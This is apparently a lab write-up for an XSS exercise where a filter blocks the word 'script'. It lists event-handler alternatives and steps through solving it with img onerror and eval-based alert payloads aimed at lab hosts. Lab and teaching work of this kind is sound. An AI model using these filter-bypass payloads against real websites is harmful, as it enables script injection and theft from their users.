XSS 04

In this example, the developer decided to completely block the word script: if the request matches script, the execution stops.

Fortunately (or unfortunately depending on what side you are on), there are a lot of ways to get JavaScript to be run (non-exhaustive list):

    * with the <a tag and for the following events: onmouseover (you will need to pass your mouse over the link), onmouseout, onmousemove, onclick ...
    * with the <a tag directly in the URL: <a href='javascript:alert(1)'... (you will need to click the link to trigger the JavaScript code and remember that this won't work since you cannot use script in this example).
    * with the <img tag directly with the event onerror: <img src='zzzz' onerror='alert(1)' />.
    * with the <div tag and for the following events: onmouseover (you will need to pass your mouse over the link), onmouseout, onmousemove, onclick...
    ...

You can use any of these techniques to get the alert box to pop-up.

 To finish this exercise, you need to trigger a pop-up (alert or confirm) with your UUID (dd19b1aa-7a48-4881-87ce-4fd3f96516f8) 
 as argument <script>alert('dd19b1aa-7a48-4881-87ce-4fd3f96516f8')</script>. 

  You can access this exercise using the following URL: http://ptl-6b48ba42-07b8fc55.libcurl.st/. 

  
Common Mistakes:

    * Make sure you don't rely on events that require user's interaction (like onmouseover)
    * Make sure you properly mix single and double quotes to get a popup

Steps: 
    1) Visit the given URL: http://ptl-6b48ba42-07b8fc55.libcurl.st/ and redirected to: http://ptl-6b48ba42-07b8fc55.libcurl.st/index.php?name=hacker

    2) Let's try with payload: <img src=x onerror=alert('XSS');>
        http://ptl-6b48ba42-07b8fc55.libcurl.st/index.php?name=hacker<img src=x onerror=alert('XSS');>
    3) So it works. We can try with our UUID as:
    http://ptl-6ed34e70-3c8724dc.libcurl.st/index.php?name=<img src=x:alert(alt) onerror=eval(src) alt=dd19b1aa-7a48-4881-87ce-4fd3f96516f8>
    4) Bravo!! We've completed this lab too. 

    Happy Hacking!! :)
